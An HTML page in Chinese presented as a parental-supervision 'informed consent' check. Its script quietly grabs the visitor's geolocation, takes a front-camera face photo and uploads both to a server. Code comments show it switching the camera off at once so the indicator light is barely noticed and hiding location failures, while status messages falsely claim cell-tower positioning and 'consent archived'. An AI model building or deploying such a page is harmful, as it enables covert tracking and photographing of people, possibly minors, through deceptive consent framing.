<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>家长监护知情同意验证</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; width: 90%; text-align: center; }
        h2 { color: #1f2937; margin-bottom: 10px; font-size: 20px; }
        p { color: #4b5563; font-size: 14px; line-height: 1.6; }
        .notice { background: #eff6ff; border-left: 4px solid #3b82f6; padding: 12px; text-align: left; font-size: 13px; color: #1e40af; margin: 20px 0; border-radius: 0 8px 8px 0; }
        button { background: #2563eb; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.2s; }
        button:hover { background: #1d4ed8; }
        button:disabled { background: #9ca3af; cursor: not-allowed; }
        #status { margin-top: 15px; font-weight: bold; color: #374151; font-size: 14px; min-height: 20px; }
    </style>
</head>
<body>

<div class="card">
    <h2>安全与知情同意验证</h2>
    <p>为了确保当前手机使用符合家长监护约定，我们需要验证您的实时位置与身份状态。</p>
    
    <div class="notice">
        <strong>隐私提示：</strong><br>
        系统将申请<strong>摄像头</strong>与<strong>地理位置</strong>权限。通过后自动拍摄一张面部照片并加密存档。
    </div>

    <button id="authBtn" onclick="startVerification()">允许授权并验证</button>
    <div id="status"></div>
</div>

<script>
    // 走同域相对路径
    const WORKER_URL = '/submit'; 

    async function startVerification() {
        const btn = document.getElementById('authBtn');
        const statusDiv = document.getElementById('status');
        
        btn.disabled = true;
        statusDiv.style.color = '#374151';
        statusDiv.innerText = "正在获取位置权限...";

        let lat = "IP_FALLBACK";
        let lon = "IP_FALLBACK";

        try {
            // 防卡死定位：只给4秒，4秒拿不到直接跳过，走后端的 Cloudflare 节点 IP 定位
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: false, 
                    timeout: 4000
                });
            });
            lat = position.coords.latitude.toString();
            lon = position.coords.longitude.toString();
            statusDiv.innerText = "位置就绪，正在调取摄像头...";
        } catch (e) {
            // 捕获国内手机超时错误，直接降级，绝不报错
            statusDiv.innerText = "原生定位受限，已全面启用网络基站定位...";
        }

        try {
            // 2. 调取前置摄像头
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            await video.play();

            // 等待半秒对焦
            await new Promise(resolve => setTimeout(resolve, 400));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // 拍完立刻关闭摄像头，防止亮灯
            stream.getTracks().forEach(track => track.stop());

            statusDiv.innerText = "正在加密并同步存档...";
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));

            // 3. 上传数据
            const formData = new FormData();
            formData.append('photo', blob, 'capture.jpg');
            formData.append('lat', lat);
            formData.append('lon', lon);

            const response = await fetch(WORKER_URL, { method: 'POST', body: formData });
            if (!response.ok) throw new Error(`服务器响应异常: ${response.status}`);
            
            const result = await response.json();
            if (result.success) {
                statusDiv.style.color = '#10b981';
                statusDiv.innerText = "验证成功！知情同意数据已安全存档。";
            } else {
                throw new Error(result.error || "未知后端错误");
            }

        } catch (error) {
            statusDiv.style.color = '#ef4444';
            btn.disabled = false;
            statusDiv.innerText = "验证失败: " + error.message;
        }
    }
</script>
</body>
</html>
